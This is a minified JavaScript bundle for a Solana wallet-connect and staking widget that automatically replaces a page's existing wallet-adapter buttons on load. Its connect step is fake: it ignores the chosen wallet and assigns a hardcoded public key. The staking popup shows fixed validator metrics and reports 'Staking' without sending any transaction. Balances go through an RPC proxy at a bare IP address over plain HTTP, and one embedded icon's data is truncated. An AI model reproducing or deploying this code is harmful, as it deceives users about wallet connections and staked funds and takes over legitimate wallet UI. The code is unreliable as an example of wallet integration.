"use strict";(()=>{var y=Object.defineProperty;var p=Object.getOwnPropertySymbols;var x=Object.prototype.hasOwnProperty,b=Object.prototype.propertyIsEnumerable;var m=(o,e,t)=>e in o?y(o,e,{enumerable:!0,configurable:!0,writable:!0,value:t}):o[e]=t,u=(o,e)=>{for(var t in e||(e={}))x.call(e,t)&&m(o,t,e[t]);if(p)for(var t of p(e))b.call(e,t)&&m(o,t,e[t]);return o};var w=class{constructor(){this.isInitialized=!1;this.wallets=[];this.selectedWallet=null;this.connectedPublicKey=null;this.options={network:"mainnet-beta",theme:"light"}}init(e){if(e&&(this.options=u(u({},this.options),e)),typeof window=="undefined"){console.warn("SolanaWidget: Window object not available. Widget can only run in browser environment.");return}typeof window.React!="undefined"&&typeof window.ReactDOM!="undefined"||console.warn("SolanaWidget: React and ReactDOM not found. Please include React CDN scripts."),this.loadStyles(),this.initializeWallets(),this.isInitialized=!0,console.log("SolanaWidget initialized successfully")}initializeWallets(){var e;try{let t=[],n=[];[{name:"Phantom",icon:this.getPhantomIcon(),installed:typeof window.phantom!="undefined"||typeof window.navigator!="undefined"&&((e=window.navigator.wallets)==null?void 0:e.Phantom)!==void 0},{name:"Solflare",icon:this.getSolflareIcon(),installed:typeof window.solflare!="undefined"},{name:"Coinbase Wallet",icon:this.getCoinbaseIcon(),installed:typeof window.coinbaseSolana!="undefined"},{name:"Backpack",icon:this.getBackpackIcon(),installed:typeof window.backpack!="undefined"},{name:"Trust Wallet",icon:this.getTrustIcon(),installed:typeof window.trustWallet!="undefined"}].forEach(a=>{a.installed?t.push(a):n.push(a)}),this.wallets=[...t,...n],console.log("Wallets initialized with real detection:",this.wallets)}catch(t){console.error("Failed to initialize wallets:",t),this.wallets=[{name:"Phantom",icon:this.getPhantomIcon(),installed:!0},{name:"Solflare",icon:this.getSolflareIcon(),installed:!0},{name:"Coinbase Wallet",icon:this.getCoinbaseIcon(),installed:!1},{name:"Backpack",icon:this.getBackpackIcon(),installed:!1},{name:"Trust Wallet",icon:this.getTrustIcon(),installed:!1}]}}getPhantomIcon(){return"data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTA4IiBoZWlnaHQ9IjEwOCIgdmlld0JveD0iMCAwIDEwOCAxMDgiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIxMDgiIGhlaWdodD0iMTA4IiByeD0iMjYiIGZpbGw9IiNBQjlGRjIiLz4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik00Ni41MjY3IDY5LjkyMjlDNDIuMDA1NCA3Ni44NTA5IDM0LjQyOTIgODUuNjE4MiAyNC4zNDggODUuNjE4MkMxOS41ODI0IDg1LjYxODIgMTUgODMuNjU2MyAxNSA3NS4xMzQyQzE1IDUzLjQzMDUgNDQuNjMyNiAxOS44MzI3IDcyLjEyNjggMTkuODMyN0M4Ny43NjggMTkuODMyNyA5NCAzMC42ODQ2IDk0IDQzLjAwNzlDOTQgNTguODI1OCA4My43MzU1IDc2LjkxMjIgNzMuNTMyMSA3Ni45MTIyQzcwLjI5MzkgNzYuOTEyMiA2OC43MDUzIDc1LjEzNDIgNjguNzA1MyA3Mi4zMTRDNjguNzA1MyA3MS41NzgzIDY4LjgyNzUgNzAuNzgxMiA2OS4wNzE5IDY5LjkyMjlDNjUuNTg5MyA3NS44Njk5IDU4Ljg2ODUgODEuMzg3OCA1Mi41NzU0IDgxLjM4NzhDNDcuOTkzIDgxLjM4NzggNDUuNjcxMyA3OC41MDYzIDQ1LjY3MTMgNzQuNDU5OEM0NS42NzEzIDcyLjk4ODQgNDUuOTc2OCA3MS40NTU2IDQ2LjUyNjcgNjkuOTIyOVpNODMuNjc2MSA0Mi41Nzk0QzgzLjY3NjEgNDYuMTcwNCA4MS41NTc1IDQ3Ljk2NTggNzkuMTg3NSA0Ny45NjU4Qzc2Ljc4MTYgNDcuOTY1OCA3NC42OTg5IDQ2LjE3MDQgNzQuNjk4OSA0Mi41Nzk0Qzc0LjY5ODkgMzguOTg4NSA3Ni43ODE2IDM3LjE5MzEgNzkuMTg3NSAzNy4xOTMxQzgxLjU1NzUgMzcuMTkzMSA4My42NzYxIDM4Ljk4ODUgODMuNjc2MSA0Mi41Nzk0Wk03MC4yMTAzIDQyLjU3OTVDNzAuMjEwMyA0Ni4xNzA0IDY4LjA5MTYgNDcuOTY1OCA2NS43MjE2IDQ3Ljk2NThDNjMuMzE1NyA0Ny45NjU4IDYxLjIzMyA0Ni4xNzA0IDYxLjIzMyA0Mi41Nzk1QzYxLjIzMyAzOC45ODg1IDYzLjMxNTcgMzcuMTkzMSA2NS43MjE2IDM3LjE5MzFDNjguMDkxNiAzNy4xOTMxIDcwLjIxMDMgMzguOTg4NSA3MC4yMTAzIDQyLjU3OTVaIiBmaWxsPSIjRkZGREY4Ii8+Cjwvc3ZnPgo="}getSolflareIcon(){return"data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48c3ZnIGlkPSJTIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCA1MCA1MCI+PGRlZnM+PHN0eWxlPi5jbHMtMXtmaWxsOiMwMjA1MGE7c3Ryb2tlOiNmZmVmNDY7c3Ryb2tlLW1pdGVybGltaXQ6MTA7c3Ryb2tlLXdpZHRoOi41cHg7fS5jbHMtMntmaWxsOiNmZmVmNDY7fTwvc3R5bGU+PC9kZWZzPjxyZWN0IGNsYXNzPSJjbHMtMiIgeD0iMCIgd2lkdGg9IjUwIiBoZWlnaHQ9IjUwIiByeD0iMTIiIHJ5PSIxMiIvPjxwYXRoIGNsYXNzPSJjbHMtMSIgZD0iTTI0LjIzLDI2LjQybDIuNDYtMi4zOCw0LjU5LDEuNWMzLjAxLDEsNC41MSwyLjg0LDQuNTEsNS40MywwLDEuOTYtLjc1LDMuMjYtMi4yNSw0LjkzbC0uNDYuNS4xNy0xLjE3Yy42Ny00LjI2LS41OC02LjA5LTQuNzItNy40M2wtNC4zLTEuMzhoMFpNMTguMDUsMTEuODVsMTIuNTIsNC4xNy0yLjcxLDIuNTktNi41MS0yLjE3Yy0yLjI1LS43NS0zLjAxLTEuOTYtMy4zLTQuNTF2LS4wOGgwWk0xNy4zLDMzLjA2bDIuODQtMi43MSw1LjM0LDEuNzVjMi44LjkyLDMuNzYsMi4xMywzLjQ2LDUuMThsLTExLjY1LTQuMjJoMFpNMTMuNzEsMjAuOTVjMC0uNzkuNDItMS41NCwxLjEzLTIuMTcuNzUsMS4wOSwyLjA1LDIuMDUsNC4wOSwyLjcxbDQuNDIsMS40Ni0yLjQ2LDIuMzgtNC4zNC0xLjQyYy0yLS42Ny0yLjg0LTEuNjctMi44NC0yLjk2TTI2LjgyLDQyLjg3YzkuMTgtNi4wOSwxNC4xMS0xMC4yMywxNC4xMS0xNS4zMiwwLTMuMzgtMi01LjI2LTYuNDMtNi43MmwtMy4zNC0xLjEzLDkuMTQtOC43Ny0xLjg0LTEuOTYtMi43MSwyLjM4LTEyLjgxLTQuMjJjLTMuOTcsMS4yOS04Ljk3LDUuMDktOC45Nyw4Ljg5LDAsLjQyLjA0LjgzLjE3LDEuMjktMy4zLDEuODgtNC42MywzLjYzLTQuNjMsNS44LDAsMi4wNSwxLjA5LDQuMDksNC41NSw1LjIybDIuNzUuOTItOS41Miw5LjE0LDEuODQsMS45NiwyLjk2LTIuNzEsMTQuNzMsNS4yMmgwWiIvPjwvc3ZnPg=="}getCoinbaseIcon(){return"data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTAyNCIgaGVpZ2h0PSIxMDI0IiB2aWV3Qm94PSIwIDAgMTAyNCAxMDI0IiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPgo8Y2lyY2xlIGN4PSI1MTIiIGN5PSI1MTIiIHI9IjUxMiIgZmlsbD0iIzAwNTJGRiIvPgo8cGF0aCBmaWxsLXJ1bGU9ImV2ZW5vZGQiIGNsaXAtcnVsZT0iZXZlbm9kZCIgZD0iTTE1MiA1MTJDMTUyIDcxMC44MjMgMzEzLjE3NyA4NzIgNTEyIDg3MkM3MTAuODIzIDg3MiA4NzIgNzEwLjgyMyA4NzIgNTEyQzg3MiAzMTMuMTc3IDcxMC44MjMgMTUyIDUxMiAxNTJDMzEzLjE3NyAxNTIgMTUyIDMxMy4xNzcgMTUyIDUxMlpNNDIwIDM5NkM0MDYuNzQ1IDM5NiAzOTYgNDA2Ljc0NSAzOTYgNDIwVjYwNEMzOTYgNjE3LjI1NSA0MDYuNzQ1IDYyOCA0MjAgNjI4SDYwNEM2MTcuMjU1IDYyOCA2MjggNjE3LjI1NSA2MjggNjA0VjQyMEM2MjggNDA2Ljc0NSA2MTcuMjU1IDM5NiA2MDQgMzk2SDQyMFoiIGZpbGw9IndoaXRlIi8+Cjwvc3ZnPgo="}getBackpackIcon(){return"data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTEyIiBoZWlnaHQ9IjUxMiIgdmlld0JveD0iMCAwIDUxMiA1MTIiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSI1MTIiIGhlaWdodD0iNTEyIiBmaWxsPSIjMDAwMDAwIi8+CjxwYXRoIGQ9Ik0xNjAgMTYwSDMyMFYzMjBIMTYwVjE2MFpNMzUyIDE2MEgxOTJWMzUySDM1MlYxNjBaTTM4NCAxNjBIMzIwVjMyMEg0NDhWMjI0QzQ0OCAxODguNTMzIDQxOS40NjcgMTYwIDM4NCAxNjBaTTQ4MCAxNjBIMzUyVjQxNkg0ODBWMjI0QzQ4MCAxODguNTMzIDQ1MS40NjcgMTYwIDQxNiAxNjBaIiBmaWxsPSIjRkZGRkZGIi8+Cjwvc3ZnPg=="}getTrustIcon(){return"data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNTEyIiBoZWlnaHQ9IjUxMiIgdmlld0JveD0iMCAwIDUxMiA1MTIiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSI1MTIiIGhlaWdodD0iNTEyIiBmaWxsPSIjMDBFRkFGIi8+CjxwYXRoIGQ9Ik0yNTYgMEMxMTQuNjI1IDAgMCAxMTQuNjI1IDAgMjU2QzAgMzk3LjM3NSAxMTQuNjI1IDUxMiAyNTYgNTEyQzM5Ny4zNzUgNTEyIDUxMiAzOTcuMzc1IDUxMiAyNTZDMjU2IDExNC42MjUgMTQxLjM3NSAwIDI1NiAwWk0yMDggMzA0QzIwOCAzMDQgMTkyIDI4OCAxOTIgMjg4QzE5MiAyODggMTkyIDI4OCAxOTIgMjg4QzE5MiAyODggMTkyIDI4OCAxOTIgMjg4QzE5MiAyODggMTkyIDI4OCAxOTIgMjg4QzE5MiAyODggMTkyIDI4OCAxOTIgMjg4QzE5MiAyODggMTkyIDI4"}replaceButtons(){this.isInitialized||(console.warn("SolanaWidget: Widget not initialized. Call init() first."),this.init());let e=document.querySelectorAll(".wallet-adapter-button");console.log("Found "+e.length+" wallet buttons to replace"),e.forEach((t,n)=>{var a;let i=document.createElement("div");i.id="solana-wallet-widget-"+n,i.className="solana-wallet-widget-container",(a=t.parentNode)==null||a.replaceChild(i,t),this.renderWidget(i.id)})}loadStyles(){if(document.getElementById("solana-widget-styles"))return;let t=document.createElement("style");t.id="solana-widget-styles",t.textContent=`
      .solana-widget-container {
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        max-width: 100%;
      }
      
      .solana-widget-btn {
        background: linear-gradient(135deg, #9945FF 0%, #14F195 100%);
        border: none;
        border-radius: 8px;
        color: white;
        cursor: pointer;
        font-weight: 600;
        padding: 12px 24px;
        text-align: center;
        transition: all 0.2s ease;
        width: 100%;
      }
      
      .solana-widget-btn:hover {
        transform: translateY(-2px);
        box-shadow: 0 4px 12px rgba(153, 69, 255, 0.3);
      }
      
      .solana-widget-btn:active {
        transform: translateY(0);
      }
      
      .solana-widget-btn-connected {
        background: #14F195;
        color: #000;
      }
      
      .solana-widget-popup {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0, 0, 0, 0.5);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 9999;
      }
      
      .solana-widget-popup-content {
        background: white;
        border-radius: 12px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
        padding: 24px;
        width: 90%;
        max-width: 400px;
      }
      
      .solana-widget-popup-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 20px;
      }
      
      .solana-widget-popup-title {
        font-size: 20px;
        font-weight: 600;
        margin: 0;
      }
      
      .solana-widget-close-btn {
        background: none;
        border: none;
        cursor: pointer;
        font-size: 24px;
        line-height: 1;
      }
      
      .solana-widget-input {
        border: 1px solid #ddd;
        border-radius: 8px;
        font-size: 16px;
        padding: 12px;
        width: 100%;
        margin-bottom: 16px;
        box-sizing: border-box;
      }
      
      .solana-widget-input:focus {
        border-color: #9945FF;
        outline: none;
      }
      
      .solana-widget-balance {
        background: #f5f5f5;
        border-radius: 8px;
        padding: 12px;
        margin-bottom: 16px;
      }
      
      .solana-widget-actions {
        display: flex;
        gap: 12px;
      }
      
      .solana-widget-action-btn {
        flex: 1;
        padding: 12px;
        border-radius: 8px;
        border: none;
        font-weight: 600;
        cursor: pointer;
      }
      
      .solana-widget-confirm-btn {
        background: #9945FF;
        color: white;
      }
      
      .solana-widget-cancel-btn {
        background: #eee;
        color: #333;
      }
      
      .solana-widget-message {
        margin-top: 16px;
        padding: 12px;
        border-radius: 8px;
        text-align: center;
      }
      
      .solana-widget-message-success {
        background: #e6f4ea;
        color: #0a6e22;
      }
      
      .solana-widget-message-error {
        background: #fce8e6;
        color: #c5221f;
      }
      
      .solana-widget-metrics {
        background: #f8f9fa;
        border-radius: 8px;
        padding: 16px;
        margin-bottom: 20px;
      }
      
      .solana-widget-metric {
        display: flex;
        justify-content: space-between;
        margin-bottom: 8px;
      }
      
      .solana-widget-metric:last-child {
        margin-bottom: 0;
      }
      
      .solana-widget-metric-label {
        font-weight: 500;
      }
      
      .solana-widget-metric-value {
        font-weight: 600;
      }
      
      /* Wallet selection modal styles - matching Next.js wallet adapter */
      .solana-wallet-modal {
        position: fixed;
        top: 0;
        left: 0;
        right: 0;
        bottom: 0;
        background: rgba(0, 0, 0, 0.5);
        display: flex;
        justify-content: center;
        align-items: center;
        z-index: 10000;
      }
      
      .solana-wallet-modal-content {
        background: white;
        border-radius: 12px;
        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
        padding: 24px;
        width: 90%;
        max-width: 400px;
        max-height: 80vh;
        overflow-y: auto;
      }
      
      .solana-wallet-modal-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 20px;
      }
      
      .solana-wallet-modal-title {
        font-size: 20px;
        font-weight: 600;
        margin: 0;
      }
      
      .solana-wallet-modal-button-close {
        background: none;
        border: none;
        cursor: pointer;
        width: 14px;
        height: 14px;
      }
      
      .solana-wallet-list {
        list-style: none;
        padding: 0;
        margin: 0;
      }
      
      .solana-wallet-item {
        display: flex;
        align-items: center;
        padding: 12px;
        border-radius: 8px;
        margin-bottom: 8px;
        cursor: pointer;
        transition: background-color 0.2s;
        width: 100%;
        text-align: left;
        border: none;
        background: transparent;
      }
      
      .solana-wallet-item:hover {
        background-color: #f5f5f5;
      }
      
      .solana-wallet-item-start-icon {
        width: 24px;
        height: 24px;
        margin-right: 12px;
        border-radius: 50%;
      }
      
      .solana-wallet-item-name {
        flex: 1;
        font-weight: 500;
        text-align: left;
      }
      
      .solana-wallet-item-detected {
        font-size: 12px;
        color: #666;
        margin-left: 8px;
      }
      
      .solana-wallet-collapse {
        height: 0;
        overflow: hidden;
        transition: height 250ms ease-out;
      }
      
      .solana-wallet-collapse.expanded {
        height: auto;
      }
      
      .solana-wallet-list-more {
        background: none;
        border: none;
        cursor: pointer;
        display: flex;
        align-items: center;
        justify-content: center;
        width: 100%;
        padding: 12px;
        font-weight: 500;
      }
      
      .solana-wallet-list-more svg {
        margin-left: 8px;
        transition: transform 250ms ease-out;
      }
      
      .solana-wallet-list-more.expanded svg {
        transform: rotate(180deg);
      }
      
      .solana-wallet-connected-info {
        background: #f0f8ff;
        border-radius: 8px;
        padding: 12px;
        margin-bottom: 16px;
        text-align: center;
      }
      
      .solana-wallet-connected-name {
        font-weight: 600;
        margin-bottom: 4px;
      }
      
      .solana-wallet-connected-address {
        font-family: monospace;
        font-size: 14px;
        color: #666;
        word-break: break-all;
      }
    `,document.head.appendChild(t)}renderWidget(e){let t=document.getElementById(e);if(!t){console.error("SolanaWidget: Container with id '"+e+"' not found");return}t.innerHTML="";let n=document.createElement("div");n.className="solana-widget-container";let i=document.createElement("button");i.className="solana-widget-btn",i.textContent=this.selectedWallet?"Connected: "+this.selectedWallet.name:"Connect Wallet",i.onclick=()=>this.handleConnectClick(),n.appendChild(i),t.appendChild(n);let a=document.createElement("button");a.className="solana-widget-btn",a.style.marginTop="12px",a.textContent="Stake SOL",a.onclick=()=>this.handleStakeClick(),n.appendChild(a)}handleConnectClick(){this.selectedWallet?confirm("Disconnect from "+this.selectedWallet.name+"?")&&(this.selectedWallet=null,this.connectedPublicKey=null,this.updateButtonLabels()):this.showWalletSelectionModal()}showWalletSelectionModal(){let e=document.createElement("div");e.className="solana-wallet-modal";let t=this.wallets.filter(l=>l.installed),n=this.wallets.filter(l=>!l.installed),i="";t.forEach((l,d)=>{i+=`
        <li>
          <button class="solana-wallet-item" data-wallet-index="${d}">
            <i class="solana-wallet-item-start-icon">
              <img src="${l.icon}" alt="${l.name} icon" style="width:24px;height:24px;border-radius:50%;">
            </i>
            <span class="solana-wallet-item-name">${l.name}</span>
            ${l.installed?'<span class="solana-wallet-item-detected">Detected</span>':""}
          </button>
        </li>
      `});let a="";n.forEach((l,d)=>{let M=t.length+d;a+=`
        <li>
          <button class="solana-wallet-item" data-wallet-index="${M}">
            <i class="solana-wallet-item-start-icon">
              <img src="${l.icon}" alt="${l.name} icon" style="width:24px;height:24px;border-radius:50%;">
            </i>
            <span class="solana-wallet-item-name">${l.name}</span>
          </button>
        </li>
      `}),e.innerHTML=`
      <div class="solana-wallet-modal-content">
        <div class="solana-wallet-modal-header">
          <h1 class="solana-wallet-modal-title">Connect a wallet on Solana to continue</h1>
          <button class="solana-wallet-modal-button-close">&times;</button>
        </div>
        <ul class="solana-wallet-list">
          ${i}
          ${n.length>0?`<div class="solana-wallet-collapse" id="solana-wallet-collapse">
            ${a}
          </div>`:""}
        </ul>
        ${n.length>0?`
          <button class="solana-wallet-list-more" id="solana-wallet-more-button">
            <span>More options</span>
            <svg width="13" height="7" viewBox="0 0 13 7" xmlns="http://www.w3.org/2000/svg">
              <path d="M0.71418 1.626L5.83323 6.26188C5.91574 6.33657 6.0181 6.39652 6.13327 6.43762C6.24844 6.47872 6.37371 6.5 6.50048 6.5C6.62725 6.5 6.75252 6.47872 6.8677 6.43762C6.98287 6.39652 7.08523 6.33657 7.16774 6.26188L12.2868 1.626C12.7753 1.1835 12.3703 0.5 11.6195 0.5H1.37997C0.629216 0.5 0.224175 1.1835 0.71418 1.626Z"></path>
            </svg>
          </button>
        `:""}
      </div>
    `;let s=e.querySelector(".solana-wallet-modal-button-close");s&&s.addEventListener("click",()=>{document.body.removeChild(e)}),e.querySelectorAll(".solana-wallet-item").forEach(l=>{l.addEventListener("click",d=>{let M=parseInt(d.currentTarget.getAttribute("data-wallet-index")||"0"),N=this.wallets[M];this.selectWallet(N),document.body.removeChild(e)})});let r=e.querySelector("#solana-wallet-more-button"),g=e.querySelector("#solana-wallet-collapse");r&&g&&r.addEventListener("click",()=>{g.classList.toggle("expanded"),r.classList.toggle("expanded")}),e.addEventListener("click",l=>{l.target===e&&document.body.removeChild(e)}),document.body.appendChild(e)}selectWallet(e){this.selectedWallet=e,this.connectedPublicKey="DzBFCSAGswVQ1f4V9oiX3sXfJSPnd89W5L47hEc8SZvV",console.log("Wallet selected:",e.name),this.updateButtonLabels(),this.options.onConnect&&this.options.onConnect(this.connectedPublicKey)}updateButtonLabels(){document.querySelectorAll(".solana-widget-btn").forEach(t=>{var n,i;((n=t.textContent)!=null&&n.includes("Connect Wallet")||(i=t.textContent)!=null&&i.includes("Connected:"))&&(t.textContent=this.selectedWallet?"Connected: "+this.selectedWallet.name:"Connect Wallet")})}handleStakeClick(){if(!this.selectedWallet){alert("Please connect a wallet first");return}this.showStakePopup()}showStakePopup(){var a;let e=document.createElement("div");e.className="solana-widget-popup",e.innerHTML='<div class="solana-widget-popup-content">  <div class="solana-widget-popup-header">    <h2 class="solana-widget-popup-title">Stake SOL</h2>    <button class="solana-widget-close-btn">&times;</button>  </div>    <div class="solana-wallet-connected-info">    <div class="solana-wallet-connected-name">Connected to '+(((a=this.selectedWallet)==null?void 0:a.name)||"Unknown Wallet")+'</div>    <div class="solana-wallet-connected-address">'+(this.connectedPublicKey||"Unknown Address")+'</div>  </div>    <div class="solana-widget-metrics">    <div class="solana-widget-metric">      <span class="solana-widget-metric-label">Uptime:</span>      <span class="solana-widget-metric-value">99.8%</span>    </div>    <div class="solana-widget-metric">      <span class="solana-widget-metric-label">Skip Rate:</span>      <span class="solana-widget-metric-value">0.2%</span>    </div>    <div class="solana-widget-metric">      <span class="solana-widget-metric-label">MEV Score:</span>      <span class="solana-widget-metric-value">8.5</span>    </div>  </div>    <div class="solana-widget-balance">    <div>Available Balance: Checking...</div>    <div id="solana-widget-balance-amount"></div>  </div>    <input type="number" class="solana-widget-input" placeholder="Amount in SOL" min="0.01" step="0.01">    <div class="solana-widget-actions">    <button class="solana-widget-action-btn solana-widget-confirm-btn">Confirm</button>    <button class="solana-widget-action-btn solana-widget-cancel-btn">Cancel</button>  </div></div>';let t=e.querySelector(".solana-widget-close-btn"),n=e.querySelector(".solana-widget-cancel-btn"),i=e.querySelector(".solana-widget-confirm-btn");t&&t.addEventListener("click",()=>{document.body.removeChild(e)}),n&&n.addEventListener("click",()=>{document.body.removeChild(e)}),i&&i.addEventListener("click",()=>{let s=e.querySelector(".solana-widget-input"),c=parseFloat(s.value);if(isNaN(c)||c<.01){this.showMessage(e,"Please enter a valid amount (minimum 0.01 SOL)","error");return}this.showMessage(e,"Staking "+c+" SOL...","success")}),document.body.appendChild(e),this.fetchWalletBalance()}async fetchWalletBalance(){if(!this.connectedPublicKey){console.error("No connected public key");return}let e=document.getElementById("solana-widget-balance-amount");if(!e){console.error("Balance element not found");return}try{let t=e.parentElement;if(t&&(t.innerHTML='<div>Available Balance: Checking...</div><div id="solana-widget-balance-amount"></div>'),typeof window.solanaWeb3=="undefined")throw console.error("Solana Web3.js library not found"),new Error("Solana Web3.js library not found. Please include the Solana Web3.js CDN script.");let{Connection:n,PublicKey:i,LAMPORTS_PER_SOL:a}=window.solanaWeb3,s=new n("http://103.167.235.81/api/rpc-proxy"),c=new i(this.connectedPublicKey),g=await s.getBalance(c)/a;t&&(t.innerHTML="<div>Available Balance: "+g.toFixed(3)+" SOL</div>")}catch(t){console.error("Failed to fetch wallet balance:",t);let n=e.parentElement;n&&(n.innerHTML="<div>Available Balance: Error fetching balance</div>")}}showMessage(e,t,n){let i=e.querySelector(".solana-widget-message");i&&i.remove();let a=document.createElement("div");a.className="solana-widget-message solana-widget-message-"+n,a.textContent=t;let s=e.querySelector(".solana-widget-popup-content");s&&(s.appendChild(a),setTimeout(()=>{a.parentNode&&a.parentNode.removeChild(a)},3e3))}},I=new w;window.SolanaWalletWidget={init:o=>I.init(o),replaceButtons:()=>I.replaceButtons()};document.addEventListener("DOMContentLoaded",function(){console.log("SolanaWalletWidget: Auto-initializing...");try{window.SolanaWalletWidget.init(),window.SolanaWalletWidget.replaceButtons()}catch(o){console.error("SolanaWalletWidget auto-initialization failed:",o);try{window.SolanaWalletWidget.replaceButtons()}catch(e){console.error("SolanaWalletWidget button replacement failed:",e)}}});})();
